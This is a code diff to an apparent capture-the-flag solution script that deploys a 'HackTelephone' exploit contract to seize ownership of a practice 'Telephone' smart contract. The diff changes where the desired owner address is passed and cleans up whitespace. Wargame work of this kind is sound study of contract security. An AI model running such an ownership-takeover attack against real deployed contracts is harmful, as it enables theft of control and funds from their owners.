@@ -19,30 +19,30 @@ async function main() {
         const desiredOwnerAddress: string = await desiredOwner.getAddress();
 
         console.log("Contract Instance Loaded");
-        
+
         // Deploy the telephone contract exploit with the address we want to make the owner of the original contract
         const exploitFactory = await ethers.getContractFactory("HackTelephone");
-        const exploitTelephoneContract = await exploitFactory.deploy(contractAddress, desiredOwnerAddress);
-        
+        const exploitTelephoneContract = await exploitFactory.deploy(contractAddress);
+
         console.log(`Telephone Contract Address: ${contract.address}`);
         console.log(`Exploit Contract Address: ${exploitTelephoneContract.address}`);
         console.log(`Desired Contract Owner Address: ${desiredOwnerAddress}`);
-         
+
         console.log("Attacking contract...");
-        await exploitTelephoneContract.attack();
+        await exploitTelephoneContract.attack(desiredOwnerAddress);
         // Verify that the contract owner has been changed to the desired owner
         if (await contract.owner() == desiredOwnerAddress) {
-            console.log("--------Attack Successful---------") 
+            console.log("--------Attack Successful---------")
         } else {
             console.log("----------Attack Failed-----------");
             console.log(`Contract owner: ${await contract.owner()}`);
-        } 
+        }
     }
-  }
-  
+}
+
 main()
     .then(() => process.exit(0))
     .catch((error) => {
         console.error(error)
         process.exit(1)
-});
+    });
